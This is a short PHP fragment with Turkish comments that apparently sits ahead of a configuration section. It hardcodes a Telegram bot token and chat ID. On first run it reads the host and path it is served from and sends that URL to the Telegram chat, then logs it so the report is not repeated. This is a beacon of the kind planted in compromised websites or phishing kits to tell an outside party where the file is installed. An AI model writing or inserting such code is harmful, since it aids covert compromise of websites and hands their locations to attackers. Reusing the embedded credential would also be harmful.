...
$token = "7408806061:AAGy__Qhk05rjyHs_IC6NNv7WJmzvAmaKEc";
$chat_id = "1342133634";

// Kayıtlı linkleri tutmak için bir dosya oluşturun
$links_file = "sent_lidnks.txt";

// Bu PHP dosyasının çalıştığı adresi alın
$base_url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Göndermek istediğiniz linki oluşturun
$link = "http://" . $base_url;

// Daha önce gönderilmiş bir link değilse, Telegram bot API aracılığıyla mesajı gönderin
if(!file_get_contents($links_file)){
    $message = urlencode("Bu linki kontrol et: " . $link);
    ...
    // Linki kaydet
    file_put_contents($links_file, $link . PHP_EOL, FILE_APPEND | LOCK_EX);
}
/* Configurasi */
